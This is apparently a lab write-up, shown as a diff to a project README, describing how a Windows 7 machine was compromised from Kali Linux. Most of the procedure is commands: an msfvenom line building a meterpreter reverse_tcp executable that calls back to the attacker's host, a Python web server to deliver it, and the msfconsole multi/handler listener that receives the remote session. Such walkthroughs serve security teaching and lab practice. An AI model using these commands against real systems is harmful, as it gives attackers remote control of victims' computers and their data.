@@ -17,3 +17,61 @@ The primary objective of this project was to gain remote access to a **Windows 7
 | **Payload Generation** | `msfvenom` | Used to generate the custom, malicious executable (`venom.exe`). |
 | **Delivery Mechanism** | Python `http.server` | Used to quickly host and transfer the payload (`venom.exe`) to the target machine over port `8080`. |
 
+## ⚙️ Execution Summary (Procedure)
+
+### Step 1: Information Gathering
+
+The IP addresses of both machines were identified:
+
+* **Attacker IP (Kali Linux):** `35.35.35.4`
+    * *Command:* `ifconfig eth0`
+* **Victim IP (Windows 7):** `35.35.35.8`
+    * *Command:* `ipconfig`
+
+### Step 2: Weaponization
+
+The **`msfvenom`** command was used to generate the payload:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=35.35.35.4 LPORT=3535 -f exe -o venom.exe
+```
+
+* **Payload:** `windows/meterpreter/reverse_tcp`. This payload creates a connection from the victim back to the attacker.
+
+* **LHOST:** Attacker IP address (`35.35.35.4`).
+
+* **LPORT:** Port for the reverse connection (`3535`).
+
+* **Output:** `venom.exe`
+
+
+### Step 3: Delivery
+
+1. A Python web server was hosted on the attacker (Kali Linux) machine:
+
+```bash
+python -m http.server 8080
+```
+
+2. The target (Windows 7) accessed `http://35.35.35.4:8080` and downloaded the `venom.exe` payload.
+
+
+### Step 4: Exploitation
+
+1. A listener was started on the Kali machine using `msfconsole`:
+
+```bash
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 35.35.35.4
+set LPORT 3535
+run
+```
+
+2. The `venom.exe` payload was executed on the Windows 7 target machine.
+
+3. Upon execution, a **Meterpreter session** was successfully opened on the Kali machine.
+
+
+The target was successfully compromised , allowing post-exploitation commands like `sysinfo` and `ls` to be run on the victim system.
